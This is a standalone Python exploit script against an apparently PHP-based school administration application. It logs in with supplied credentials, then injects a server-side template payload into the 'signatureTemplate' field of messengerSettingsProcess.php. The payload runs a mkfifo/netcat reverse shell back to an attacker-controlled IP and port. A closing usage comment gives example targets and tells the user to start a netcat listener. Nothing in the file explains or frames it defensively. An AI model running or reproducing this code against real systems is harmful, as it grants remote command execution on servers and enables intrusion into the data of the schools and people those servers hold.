import requests
import re

def login(target_host, target_port, email, password):
    url = f'http://{target_host}:{target_port}/login.php'
    headers = {"Content-Type": "multipart/form-data; boundary=174475955731268836341556039466"}
    data = f"""
    --174475955731268836341556039466
    Content-Disposition: form-data; name="username"

    {email}
    --174475955731268836341556039466
    Content-Disposition: form-data; name="password"

    {password}
    --174475955731268836341556039466--
    """
    response = requests.post(url, headers=headers, data=data, allow_redirects=False)
    return response.cookies.get('PHPSESSID')

def exploit(cookie, target_host, target_port, attacker_ip, attacker_port):
    url = f'http://{target_host}:{target_port}/modules/School%20Admin/messengerSettingsProcess.php'
    headers = {
        "Content-Type": "multipart/form-data; boundary=67142646631840027692410521651",
        "Cookie": f"PHPSESSID={cookie}"
    }
    payload = f"{{{{['rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc {attacker_ip} {attacker_port} >/tmp/f']|filter('system')}}}}"
    data = f"""
    --67142646631840027692410521651
    Content-Disposition: form-data; name="signatureTemplate"

    {payload}
    --67142646631840027692410521651--
    """
    requests.post(url, headers=headers, data=data)

# Usage: Replace variables below and run with a netcat listener.
cookie = login("192.168.1.100", "8080", "admin@example.com", "password")
exploit(cookie, "192.168.1.100", "8080", "10.0.0.1", "4444")
